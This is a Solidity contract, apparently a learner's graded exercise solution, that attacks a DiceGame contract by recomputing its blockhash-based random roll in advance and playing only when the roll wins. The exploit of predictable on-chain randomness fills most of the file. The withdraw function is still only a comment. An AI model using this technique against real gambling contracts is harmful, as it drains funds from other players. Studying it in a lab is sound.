pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    address public diceGameAddr;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
        diceGameAddr = diceGameAddress;
    }

    //Add withdraw function to transfer ether from the rigged contract to an address

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public payable {
        // Predicting the outcome of the roll
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, diceGameAddr, nonce));
        uint256 roll = uint256(hash) % 16;

        console.log('\t',"   Predicted Roll:",roll);

        if(roll>2){
            return;
        }
        else{
            // Check that this contract has atleast 0.002 eth
            uint256 ValueToSend = 0.002 ether;
            require(address(this).balance>=ValueToSend, "You do not have enough eth to make a roll!");

            // Make the roll
            diceGame.rollTheDice{value: ValueToSend}();
            // require(sent, "Failed to roll dice!");
        }
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {
    }
}
